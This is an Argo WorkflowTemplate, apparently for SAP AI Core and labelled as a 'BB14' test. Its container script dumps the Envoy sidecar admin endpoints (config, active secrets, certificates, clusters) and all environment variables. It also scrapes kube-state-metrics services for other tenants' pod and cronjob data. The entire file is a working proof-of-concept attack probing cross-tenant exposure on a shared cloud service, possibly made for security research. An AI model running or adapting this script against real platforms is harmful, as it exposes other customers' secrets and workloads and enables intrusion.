apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-exec
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-exec"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-exec"
    ai.sap.com/version: "25.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        echo "=== V25 FULL EVIDENCE DUMP ==="
        echo "=== SECTION:KSM-CUSTOM-FULL ==="
        curl -s "http://ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1
        echo "=== END:KSM-CUSTOM-FULL ==="
        echo "=== SECTION:ENVOY-CONFIG-DUMP ==="
        curl -s "http://localhost:15000/config_dump" 2>&1 | wc -c
        echo "=== END:ENVOY-CONFIG-DUMP ==="
        echo "=== SECTION:ENVOY-SDS ==="
        curl -s "http://localhost:15000/config_dump?resource=dynamic_active_secrets" 2>&1 | wc -c
        echo "=== END:ENVOY-SDS ==="
        echo "=== SECTION:ENVOY-CERTS ==="
        curl -s "http://localhost:15000/certs" 2>&1
        echo "=== END:ENVOY-CERTS ==="
        echo "=== SECTION:ENVOY-CLUSTERS ==="
        curl -s "http://localhost:15000/clusters" 2>&1 | head -c 50000
        echo "=== END:ENVOY-CLUSTERS ==="
        echo "=== SECTION:KSM-PODS-CROSS-TENANT ==="
        curl -s "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | grep -E "kube_pod_info|kube_pod_container_info" | grep -v "rg-3ba0e0a4" | head -200
        echo "=== END:KSM-PODS-CROSS-TENANT ==="
        echo "=== SECTION:KSM-MULTI-CRONJOBS ==="
        curl -s "http://ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | grep "kube_cronjob"
        echo "=== END:KSM-MULTI-CRONJOBS ==="
        echo "=== SECTION:ENV ==="
        env | sort
        echo "=== END:ENV ==="
        echo "=== V25 DONE ==="
